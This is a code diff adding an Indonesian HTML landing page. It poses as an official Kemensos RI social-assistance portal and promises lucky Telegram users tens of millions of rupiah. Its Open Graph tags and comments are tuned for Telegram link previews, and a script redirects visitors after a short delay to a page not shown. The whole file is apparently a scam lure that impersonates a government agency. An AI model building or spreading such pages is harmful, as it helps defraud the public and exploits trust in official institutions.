@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <title>Layanan Bantuan Sosial Resmi – Kemensos RI</title>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- BASIC SEO (PENTING UNTUK TELEGRAM) -->
+    <meta name="description"
+          content="Portal resmi Layanan dan panduan Untuk Klaim dana Manfaat Pulhan Juta Rupiah Bagi Setiap Pengguna aplikasi Telegram Yang Beruntung .">
+
+    <!-- OPEN GRAPH (WAJIB TELEGRAM) -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Dana Manfaat Puluhan Juta Rupiah – Telegram & King kevin">
+    <meta property="og:description"
+          content="Portal resmi Layanan dan panduan Untuk Klaim dana Manfaat Pulhan Juta Rupiah Bagi Setiap Pengguna aplikasi Telegram Yang Beruntung .">
+    <meta property="og:image" content="https://i.imgur.com/a/AW9UH0l.jpg">
+    <meta property="og:url" content="">
+
+    <!-- TWITTER (AMAN) -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #ffffff;
+            color: #111827;
+            text-align: center;
+        }
+
+        .loading-box {
+            max-width: 320px;
+        }
+
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 4px solid #e5e7eb;
+            border-top: 4px solid #92400e;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 14px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="loading-box">
+        <div class="spinner"></div>
+        <p class="loading-text">
+            Memuat Sistem…<br>
+            Mohon tunggu sebentar.
+        </p>
+    </div>
+
+    <script>
+        // ⏳ Delay 1200ms AGAR TELEGRAM BISA AMBIL OG IMAGE
+        setTimeout(() => {
+            window.location.href = "components/home.html";
+        }, 1200);
+    </script>
+</body>
+</html>
